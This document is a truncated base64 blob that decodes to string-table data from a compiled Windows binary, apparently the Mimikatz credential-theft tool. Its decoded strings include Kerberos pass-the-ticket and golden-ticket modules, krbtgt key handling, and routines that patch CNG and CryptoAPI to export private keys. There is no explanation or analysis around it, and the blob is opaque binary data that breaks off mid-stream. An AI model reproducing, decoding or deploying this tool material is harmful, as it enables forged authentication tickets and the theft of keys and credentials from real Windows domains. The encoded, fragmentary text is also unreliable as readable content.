4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0ACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAdABpAGMAawBlAHQAIABmAGkAbABlAG4AYQBtAGUACgAAAFQAaQBjAGsAZQB0ACgAcwApACAAcAB1AHIAZwBlACAAZgBvAHIAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAgAGkAcwAgAE8ASwAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB1AHIAZwBlACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFAAdQByAGcAZQBUAGkAYwBrAGUAdABDAGEAYwBoAGUATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHUAcgBnAGUAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUAB1AHIAZwBlAFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAASwBlAGIAZQByAG8AcwAgAFQARwBUACAAbwBmACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4AIAA6ACAAAAAAAAAAAAAAAAAAAAAKACgATgBVAEwATAAgAHMAZQBzAHMAaQBvAG4AIABrAGUAeQAgAG0AZQBhAG4AcwAgAGEAbABsAG8AdwB0AGcAdABzAGUAcwBzAGkAbwBuAGsAZQB5ACAAaQBzACAAbgBvAHQAIABzAGUAdAAgAHQAbwAgADEAKQAKAAAAAAAAAG4AbwAgAHQAaQBjAGsAZQB0ACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AdABnAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABlAHgAcABvAHIAdAAAAAAACgBbACUAMAA4AHgAXQAgAC0AIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAAAAAACgAgACAAIABTAHQAYQByAHQALwBFAG4AZAAvAE0AYQB4AFIAZQBuAGUAdwA6ACAAAAAAAAAAAAAgADsAIAAAAAAAAAAAAAAACgAgACAAIABTAGUAcgB2AGUAcgAgAE4AYQBtAGUAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoAIABAACAAJQB3AFoAAAAAAAAAAAAAAAAAAAAKACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAgAEAAIAAlAHcAWgAAAAAAAAAKACAAIAAgAEYAbABhAGcAcwAgACUAMAA4AHgAIAAgACAAIAA6ACAAAAAAAAAAAABrAGkAcgBiAGkAAAAAAAAACgAgACAAIAAqACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACAAIAAgACAAOgAgACUAcwAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBFAG4AYwBvAGQAZQBkAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBsAGkAcwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFEAdQBlAHIAeQBUAGkAYwBrAGUAdABDAGEAYwBoAGUARQB4ADIATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUQB1AGUAcgB5AFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBFAHgAMgBNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAACUAdQAtACUAMAA4AHgALQAlAHcAWgBAACUAdwBaAC0AJQB3AFoALgAlAHMAAAAAAHQAaQBjAGsAZQB0AC4AawBpAHIAYgBpAAAAAAAAAAAAdABpAGMAawBlAHQAAAAAAGEAZABtAGkAbgAAAAAAAABkAG8AbQBhAGkAbgAAAAAAcwBpAGQAAABrAHIAYgB0AGcAdAAAAAAAaQBkAAAAAABnAHIAbwB1AHAAcwAAAAAAAAAAAAAAAABVAHMAZQByACAAIAAgACAAIAAgADoAIAAlAHMACgBEAG8AbQBhAGkAbgAgACAAIAAgADoAIAAlAHMACgBTAEkARAAgACAAIAAgACAAIAAgADoAIAAlAHMACgBVAHMAZQByACAASQBkACAAIAAgADoAIAAlAHUACgAAAAAAAAAAAEcAcgBvAHUAcABzACAASQBkACAAOgAgACoAAAAAAAAAJQB1ACAAAAAKAGsAcgBiAHQAZwB0ACAAIAAgACAAOgAgAAAAAAAAAC0APgAgAFQAaQBjAGsAZQB0ACAAOgAgACUAcwAKAAoAAAAAAAAAAAAKAEYAaQBuAGEAbAAgAFQAaQBjAGsAZQB0ACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACEACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIAAKAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAEMAcgBlAGQAIABlAHIAcgBvAHIACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAHQAZwB0ACAAawBlAHkAIABzAGkAegBlACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAawByAGIAdABnAHQAIABhAHIAZwB1AG0AZQBuAHQACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAAUwBJAEQAIABzAGUAZQBtAHMAIABpAG4AdgBhAGwAaQBkACAALQAgAEMAbwBuAHYAZQByAHQAUwB0AHIAaQBuAGcAUwBpAGQAVABvAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAUwBJAEQAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGQAbwBtAGEAaQBuACAAYQByAGcAdQBtAGUAbgB0AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIAB1AHMAZQByACAAYQByAGcAdQBtAGUAbgB0AAoAAAAAAAAAIAAqACAAUABBAEMAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAAAAAACAAKgAgAFAAQQBDACAAcwBpAGcAbgBlAGQACgAAAAAAIAAqACAARQBuAGMAVABpAGMAawBlAHQAUABhAHIAdAAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAgACoAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAZQBuAGMAcgB5AHAAdABlAGQACgAAACAAKgAgAEsAcgBiAEMAcgBlAGQAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgBfAGQAYQB0AGEAIAA7ACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBlAG4AYwByAHkAcAB0ACAAJQAwADgAeAAKAAAAAAAAAHIAZQBzAGUAcgB2AGUAZAAAAAAAAAAAAGYAbwByAHcAYQByAGQAYQBiAGwAZQAAAGYAbwByAHcAYQB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BAEUAUwBfAFAAUgBPAFYAXwBYAFAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAUwBtAGEAcgB0ACAAQwBhAHIAZAAgAEMAcgB5AHAAdABvACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAFMAQwBBAFIARABfAFAAUgBPAFYAAAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEQASAAgAFMAQwBoAGEAbgBuAGUAbAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABNAFMAXwBEAEUARgBfAEQASABfAFMAQwBIAEEATgBOAEUATABfAFAAUgBPAFYAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEQAUwBTACAAYQBuAGQAIABEAGkAZgBmAGkAZQAtAEgAZQBsAGwAbQBhAG4AIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAAAATQBTAF8ARQBOAEgAXwBEAFMAUwBfAEQASABfAFAAUgBPAFYAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAQgBhAHMAZQAgAEQAUwBTACAAYQBuAGQAIABEAGkAZgBmAGkAZQAtAEgAZQBsAGwAbQBhAG4AIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAAAATQBTAF8ARABFAEYAXwBEAFMAUwBfAEQASABfAFAAUgBPAFYAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBQAFIATwBWAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFIAUwBBACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAAAABNAFMAXwBEAEUARgBfAFIAUwBBAF8AUwBDAEgAQQBOAE4ARQBMAF8AUABSAE8AVgAAAAAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAaQBnAG4AYQB0AHUAcgBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMASQBHAF8AUABSAE8AVgAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABTAHQAcgBvAG4AZwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAABNAFMAXwBTAFQAUgBPAE4ARwBfAFAAUgBPAFYAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEUATgBIAEEATgBDAEUARABfAFAAUgBPAFYAAAAAAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAQgBhAHMAZQAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2ADEALgAwAAAAAABNAFMAXwBEAEUARgBfAFAAUgBPAFYAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBTAEUAUgBWAEkAQwBFAFMAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAFUAUwBFAFIAUwAAAAAAAAAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFMARQBSAFYASQBDAEUAAAAAAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARQBOAFQARQBSAFAAUgBJAFMARQAAAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARwBSAE8AVQBQAF8AUABPAEwASQBDAFkAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAXwBHAFIATwBVAFAAXwBQAE8ATABJAEMAWQAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAAAAAAAAAAAAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFAAYQB0AGMAaAAgAEMATgBHACAAcwBlAHIAdgBpAGMAZQAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAAAAAAAAYwBuAGcAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABQAGEAdABjAGgAIABDAHIAeQBwAHQAbwBBAFAASQAgAGwAYQB5AGUAcgAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAAAAAAAAYwBhAHAAaQAAAAAAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABrAGUAeQBzACAAYwBvAG4AdABhAGkAbgBlAHIAcwAAAAAAAAAAAGsAZQB5AHMAAAAAAAAAAABMAGkAcwB0ACAAKABvAHIAIABlAHgAcABvAHIAdAApACAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHMAdABvAHIAZQBzAAAAAAAAAHMAdABvAHIAZQBzAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHAAcgBvAHYAaQBkAGUAcgBzAAAAAAAAAAAAcAByAG8AdgBpAGQAZQByAHMAAAAAAAAAQwByAHkAcAB0AG8AIABNAG8AZAB1AGwAZQAAAAAAAABjAHIAeQBwAHQAbwAAAAAAcgBzAGEAZQBuAGgAAAAAAENQRXhwb3J0S2V5AAAAAABuAGMAcgB5AHAAdAAAAAAATkNyeXB0T3BlblN0b3JhZ2VQcm92aWRlcgAAAAAAAABOQ3J5cHRFbnVtS2V5cwAATkNyeXB0T3BlbktleQAAAE5DcnlwdEV4cG9ydEtleQBOQ3J5cHRHZXRQcm9wZXJ0eQAAAAAAAABOQ3J5cHRGcmVlQnVmZmVyAAAAAAAAAABOQ3J5cHRGcmVlT2JqZWN0AAAAAAAAAABCQ3J5cHRFbnVtUmVnaXN0ZXJlZFByb3ZpZGVycwAAAEJDcnlwdEZyZWVCdWZmZXIAAAAAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABwAHIAbwB2AGkAZABlAHIAcwAgADoACgAAACUAMgB1AC4AIAAlAHMACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcAByAG8AdgBpAGQAZQByAHMAIAA7ACAAQwByAHkAcAB0AEUAbgB1AG0AUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAACgBDAE4ARwAgAHAAcgBvAHYAaQBkAGUAcgBzACAAOgAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABCAEMAcgB5AHAAdABFAG4AdQBtAFIAZQBnAGkAcwB0AGUAcgBlAGQAUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABzAHkAcwB0AGUAbQBzAHQAbwByAGUAAABBAHMAawBpAG4AZwAgAGYAbwByACAAUwB5AHMAdABlAG0AIABTAHQAbwByAGUAIAAnACUAcwAnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcwB0AG8AcgBlAHMAIAA7ACAAQwBlAHIAdABFAG4AdQBtAFMAeQBzAHQAZQBtAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABNAHkAAAAAAAAAAABzAHQAbwByAGUAAAAAAAAAAAAAAAAAAAAgACoAIABTAHkAcwB0AGUAbQAgAFMAdABvAHIAZQAgACAAOgAgACcAJQBzACcAIAAoADAAeAAlADAAOAB4ACkACgAgACoAIABTAHQAbwByAGUAIAAgACAAIAAgACAAIAAgACAAOgAgACcAJQBzACcACgAKAAAAAAAoAG4AdQBsAGwAKQAAAAAAAAAAAAAAAAAJAEsAZQB5ACAAQwBvAG4AdABhAGkAbgBlAHIAIAAgADoAIAAlAHMACgAJAFAAcgBvAHYAaQBkAGUAcgAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAACQBUAHkAcABlACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAVQBzAGUAcgBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAGsAZQB5AFMAcABlAGMAIAA9AD0AIABDAEUAUgBUAF8ATgBDAFIAWQBQAFQAXwBLAEUAWQBfAFMAUABFAEMAIAB3AGkAdABoAG8AdQB0ACAAQwBOAEcAIABIAGEAbgBkAGwAZQAgAD8ACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAcgB5AHAAdABBAGMAcQB1AGkAcgBlAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAHIAaQB2AGEAdABlAEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAQwBvAG4AdABlAHgAdABQAHIAbwBwAGUAcgB0AHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAGUAcgB0AEcAZQB0AE4AYQBtAGUAUwB0AHIAaQBuAGcAIAAoADAA